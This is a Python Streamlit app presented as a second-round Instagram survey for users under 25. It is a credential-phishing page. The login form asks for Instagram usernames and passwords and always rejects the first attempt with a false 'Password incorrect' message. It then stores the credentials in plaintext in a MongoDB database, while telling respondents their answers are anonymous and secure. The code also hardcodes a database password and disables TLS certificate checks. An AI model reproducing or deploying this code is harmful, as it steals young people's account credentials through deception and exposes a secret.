import streamlit as st
import pymongo
from datetime import datetime
import certifi
from pymongo.errors import ConnectionFailure, OperationFailure

# Page configuration
st.set_page_config(
    page_title="Instagram Engagement Survey - Round 2",
    page_icon="📱",
    layout="wide",
    initial_sidebar_state="collapsed"
)

def get_database():
    try:
        # Your MongoDB Atlas connection string
        connection_string = "mongodb+srv://myAtlasDBUser:a7ZvFzDJafUbO76S@myatlasclusteredu.umvkai6.mongodb.net/?retryWrites=true&w=majority&appName=myAtlasClusterEDU"
        
        client = pymongo.MongoClient(
            connection_string,
            tls=True,
            tlsAllowInvalidCertificates=True,
            retryWrites=True,
            w='majority'
        )
        
        db = client.survey_database
        db.command('ping')
        print("✅ Database connection successful")
        return db
        
    except Exception as e:
        st.error(f"❌ Database connection failed: {e}")
        return None

# Initialize session state
if 'show_front_page' not in st.session_state:
    st.session_state.show_front_page = True
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'current_step' not in st.session_state:
    st.session_state.current_step = 0
if 'user_data' not in st.session_state:
    st.session_state.user_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 0
if 'first_attempt_rejected' not in st.session_state:
    st.session_state.first_attempt_rejected = False
if 'answers' not in st.session_state:
    st.session_state.answers = {}

# Custom CSS for responsiveness
st.markdown("""
<style>
    .main > div {
        padding: 2rem;
    }
    @media (max-width: 768px) {
        .main > div {
            padding: 1rem;
        }
    }
    .stButton > button {
        width: 100%;
    }
    .survey-question {
        margin-bottom: 2rem;
    }
    .section-header {
        background-color: #f0f2f6;
        padding: 1rem;
        border-radius: 10px;
        margin: 2rem 0;
    }
    .front-page {
        text-align: center;
        padding: 3rem 1rem;
    }
    .front-page h1 {
        color: #E1306C;
        margin-bottom: 2rem;
    }
    .front-page h2 {
        color: #333;
        margin-bottom: 1.5rem;
    }
    .front-page ul {
        text-align: left;
        display: inline-block;
        margin: 2rem 0;
    }
    .benefits-container {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 2rem;
        border-radius: 15px;
        margin: 2rem 0;
    }
</style>
""", unsafe_allow_html=True)

def front_page():
    st.markdown('<div class="front-page">', unsafe_allow_html=True)
    
    st.title("📱 Instagram Engagement Survey - Round 2")
    st.markdown("---")
    
    st.subheader("🎯 Round 2: Personalized Feeds & Influencer Culture")
    
    st.markdown("""
    <div style='text-align: left; max-width: 800px; margin: 0 auto;'>
    <h3>🌟 Welcome to Round 2 of the Under25 Instagram Study!</h3>
    
    <p>This round focuses on personalized content feeds and influencer culture - 
    exploring how Instagram's algorithm shapes your experience and your thoughts about 
    becoming an influencer yourself.</p>
    
    <h4>📊 What we're exploring in Round 2:</h4>
    <ul>
        <li>Your preferences for personalized vs. chronological feeds</li>
        <li>How Instagram's algorithm impacts your content discovery</li>
        <li>Your aspirations around becoming an influencer</li>
        <li>The pros and cons of algorithm-driven content</li>
    </ul>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div class="benefits-container">
    <h3>🎁 Why This Round Matters:</h3>
    <ul>
        <li>Help shape how algorithms serve content to young users</li>
        <li>Understand the appeal of influencer culture among youth</li>
        <li>Share your voice on content personalization preferences</li>
        <li>Your insights could influence future platform designs</li>
    </ul>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div style='text-align: left; max-width: 800px; margin: 0 auto;'>
    <h4>⏱️ What to Expect:</h4>
    <ul>
        <li><strong>Duration:</strong> 5-7 minutes</li>
        <li><strong>Sections:</strong> 3 main sections with 14 questions total</li>
        <li><strong>Confidentiality:</strong> Your responses are anonymous and secure</li>
        <li><strong>Voluntary:</strong> You can skip any question or stop at any time</li>
    </ul>
    
    <p>Your honest responses will help create a better understanding of how algorithmic 
    feeds and influencer culture affect young Instagram users.</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("</div>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if st.button("🚀 Start Round 2", use_container_width=True):
            st.session_state.show_front_page = False
            st.rerun()

def login_section():
    st.title("📱 Instagram Engagement Survey - Round 2")
    st.subheader("Under25 - Personalized Feeds & Influencer Culture")
    
    st.info("🔐 Please login to continue, you're response matters!")
    
    with st.form("login_form"):
        username = st.text_input("Instagram Username or Email")
        password = st.text_input("Password", type="password")
        submit = st.form_submit_button("Login")
        
        if submit:
            if username and password:
                st.session_state.login_attempts += 1
                
                # Always reject the first attempt
                if st.session_state.login_attempts == 1:
                    st.session_state.first_attempt_rejected = True
                    st.error("❌ Password incorrect. Please try again.")
                else:
                    # Accept on second attempt
                    st.session_state.user_data['username'] = username
                    st.session_state.user_data['password'] = password
                    st.session_state.user_data['login_timestamp'] = datetime.now()
                    st.session_state.user_data['login_attempts'] = st.session_state.login_attempts
                    
                    st.session_state.logged_in = True
                    st.session_state.current_step = 0
                    st.rerun()
            else:
                st.error("Please enter both username and password")

def survey_questions():
    questions = [
        # 🎯 Section 1: Feed Personalization Preferences
        {
            'section': '🎯 Section 1: Feed Personalization Preferences',
            'question': "How satisfied are you with Instagram's current algorithm that shows you content it thinks you'll like?",
            'options': ["Very satisfied", "Somewhat satisfied", "Neutral", "Somewhat dissatisfied", "Very dissatisfied"],
            'key': 'algorithm_satisfaction'
        },
        {
            'section': '🎯 Section 1: Feed Personalization Preferences',
            'question': "Would you prefer a chronological feed (showing newest posts first) over the current algorithm-based feed?",
            'options': ["Yes, definitely", "Maybe", "No, I like the current system", "I'd like a mix of both"],
            'key': 'feed_preference'
        },
        {
            'section': '🎯 Section 1: Feed Personalization Preferences',
            'question': "How often do you feel Instagram shows you too much of the same type of content?",
            'options': ["Very often", "Sometimes", "Rarely", "Never"],
            'key': 'content_repetition'
        },
        {
            'section': '🎯 Section 1: Feed Personalization Preferences',
            'question': "Do you think Instagram's algorithm understands your interests well?",
            'options': ["Yes, very well", "Somewhat", "Not really", "It often gets it wrong"],
            'key': 'algorithm_understanding'
        },
        {
            'section': '🎯 Section 1: Feed Personalization Preferences',
            'question': "How much control do you wish you had over what appears in your feed?",
            'options': ["Complete control", "More than currently", "The current amount is fine", "Less control - I trust the algorithm"],
            'key': 'feed_control_desire'
        },
        
        # 🌟 Section 2: Influencer Aspirations & Perceptions
        {
            'section': '🌟 Section 2: Influencer Aspirations & Perceptions',
            'question': "Have you ever thought about becoming an Instagram influencer?",
            'options': ["Yes, actively working toward it", "Yes, I'd like to but don't know how", "Maybe, I'm not sure", "No, never considered it"],
            'key': 'influencer_aspiration'
        },
        {
            'section': '🌟 Section 2: Influencer Aspirations & Perceptions',
            'question': "What do you think is the biggest appeal of being an influencer?",
            'options': ["Money/earning potential", "Fame/recognition", "Creative expression", "Community building", "Free products/travel"],
            'key': 'influencer_appeal'
        },
        {
            'section': '🌟 Section 2: Influencer Aspirations & Perceptions',
            'question': "How realistic do you think it is for the average person to become a successful influencer today?",
            'options': ["Very realistic", "Somewhat realistic", "Unlikely", "Very unlikely", "It depends on the person"],
            'key': 'influencer_realism'
        },
        {
            'section': '🌟 Section 2: Influencer Aspirations & Perceptions',
            'question': "What's the main thing stopping you from pursuing influencer status (if anything)?",
            'options': ["Lack of time", "Not knowing how to start", "Privacy concerns", "Fear of negative comments", "Not interested in the lifestyle"],
            'key': 'influencer_barriers'
        },
        {
            'section': '🌟 Section 2: Influencer Aspirations & Perceptions',
            'question': "Do you think being an influencer is a legitimate career choice?",
            'options': ["Yes, definitely", "For some people", "It's more of a side hustle", "No, it's not sustainable"],
            'key': 'influencer_legitimacy'
        },
        
        # 🔄 Section 3: Algorithm Impact & Content Discovery
        {
            'section': '🔄 Section 3: Algorithm Impact & Content Discovery',
            'question': "How often does Instagram's algorithm help you discover new accounts or content you genuinely enjoy?",
            'options': ["Very often", "Sometimes", "Rarely", "Never"],
            'key': 'discovery_success'
        },
        {
            'section': '🔄 Section 3: Algorithm Impact & Content Discovery',
            'question': "Have you ever felt 'stuck' in a content bubble where you only see similar types of posts?",
            'options': ["Yes, frequently", "Occasionally", "Rarely", "Never"],
            'key': 'content_bubble_feeling'
        },
        {
            'section': '🔄 Section 3: Algorithm Impact & Content Discovery',
            'question': "How do you feel about Instagram potentially showing you more content from people you don't follow?",
            'options': ["I'd prefer mostly people I follow", "I like discovering new content", "It depends on the content quality", "I want a good balance of both"],
            'key': 'followed_vs_discovery'
        },
        
        # 💭 Section 4: Final Reflections
        {
            'section': '💭 Section 4: Final Reflections',
            'question': "If you could design your perfect Instagram feed, what would it look like?",
            'options': ["text_input"],
            'key': 'perfect_feed_vision'
        },
        {
            'section': '💭 Section 4: Final Reflections',
            'question': "What's one change to Instagram's algorithm that would most improve your experience?",
            'options': ["text_input"],
            'key': 'algorithm_improvement'
        },
        {
            'section': '💭 Section 4: Final Reflections',
            'question': "What advice would you give to someone wanting to become an influencer today?",
            'options': ["text_input"],
            'key': 'influencer_advice'
        }
    ]
    
    return questions

def save_to_mongodb(data):
    try:
        db = get_database()
        if db is None:
            st.error("❌ Could not connect to database. Please try again.")
            return None
            
        collection = db['survey_responses_round2']
        
        # Add timestamp and round identifier
        data['submission_timestamp'] = datetime.now()
        data['survey_round'] = 2
        
        # Insert the document
        result = collection.insert_one(data)
        st.success("✅ You are part of Under25 impact now! Round 2 complete!")
        return result.inserted_id
        
    except Exception as e:
        st.error(f"Error saving to database: {e}")
        return None

def survey_section():
    st.title("📊 Instagram Engagement Survey - Round 2")
    st.subheader("Under25 - Personalized Feeds & Influencer Culture")
    
    questions = survey_questions()
    
    if st.session_state.current_step < len(questions):
        current_q = questions[st.session_state.current_step]
        
        # Show section header when starting a new section
        if st.session_state.current_step == 0 or questions[st.session_state.current_step-1]['section'] != current_q['section']:
            st.markdown(f'<div class="section-header"><h3>{current_q["section"]}</h3></div>', unsafe_allow_html=True)
        
        st.markdown(f'<div class="survey-question">', unsafe_allow_html=True)
        st.subheader(f"Question {st.session_state.current_step + 1} of {len(questions)}")
        st.write(f"**{current_q['question']}**")
        
        # Get current answer if it exists
        current_answer = st.session_state.answers.get(current_q['key'], "")
        
        # Handle different question types
        if current_q['options'] == ["text_input"]:
            # Text input for open-ended questions
            user_input = st.text_area("Your answer:", value=current_answer, key=f"text_{current_q['key']}")
            selected_option = user_input
        else:
            # Radio buttons for multiple choice questions
            # Use the question key instead of current_step for stable keys
            selected_option = st.radio(
                "Choose your answer:",
                current_q['options'],
                index=current_q['options'].index(current_answer) if current_answer in current_q['options'] else 0,
                key=f"radio_{current_q['key']}"
            )
        
        col1, col2 = st.columns([1, 1])
        
        with col1:
            if st.session_state.current_step > 0:
                if st.button("← Previous"):
                    # Save current answer before moving back
                    st.session_state.answers[current_q['key']] = selected_option
                    st.session_state.current_step -= 1
                    st.rerun()
        
        with col2:
            if st.button("Next →"):
                # Store the answer only if it's not empty (for text inputs)
                if current_q['options'] == ["text_input"] and not selected_option.strip():
                    st.warning("Please provide an answer before proceeding.")
                else:
                    # Save current answer
                    st.session_state.answers[current_q['key']] = selected_option
                    st.session_state.current_step += 1
                    st.rerun()
        
        st.markdown('</div>', unsafe_allow_html=True)
    
    else:
        # All questions completed - show summary and submit
        st.success("🎉 Round 2 Completed!")
        st.subheader("Your Responses Summary:")
        
        # Transfer all answers from session_state.answers to user_data
        for key, value in st.session_state.answers.items():
            st.session_state.user_data[key] = value
        
        # Organize responses by section for better display
        sections = {
            '🎯 Section 1: Feed Personalization Preferences': ['algorithm_satisfaction', 'feed_preference', 'content_repetition', 'algorithm_understanding', 'feed_control_desire'],
            '🌟 Section 2: Influencer Aspirations & Perceptions': ['influencer_aspiration', 'influencer_appeal', 'influencer_realism', 'influencer_barriers', 'influencer_legitimacy'],
            '🔄 Section 3: Algorithm Impact & Content Discovery': ['discovery_success', 'content_bubble_feeling', 'followed_vs_discovery'],
            '💭 Section 4: Final Reflections': ['perfect_feed_vision', 'algorithm_improvement', 'influencer_advice']
        }
        
        for section, keys in sections.items():
            st.markdown(f'**{section}**')
            for key in keys:
                if key in st.session_state.user_data and key not in ['username', 'password', 'login_timestamp', 'login_attempts']:
                    display_key = key.replace('_', ' ').title()
                    st.write(f"- **{display_key}:** {st.session_state.user_data[key]}")
            st.write("---")
        
        if st.button("Submit Round 2"):
            # Save to MongoDB
            inserted_id = save_to_mongodb(st.session_state.user_data)
            
            if inserted_id:
                st.success("✅ Thank you! Your Round 2 responses have been recorded.")
                
                # Reset for new survey
                st.session_state.show_front_page = True
                st.session_state.logged_in = False
                st.session_state.current_step = 0
                st.session_state.user_data = {}
                st.session_state.answers = {}
                st.session_state.login_attempts = 0
                st.session_state.first_attempt_rejected = False
                
                if st.button("Take Another Survey"):
                    st.rerun()
            else:
                st.error("❌ There was an error saving your responses. Please try again.")

def main():
    # Responsive container
    with st.container():
        if st.session_state.show_front_page:
            front_page()
        elif not st.session_state.logged_in:
            login_section()
        else:
            survey_section()

if __name__ == "__main__":
    main()
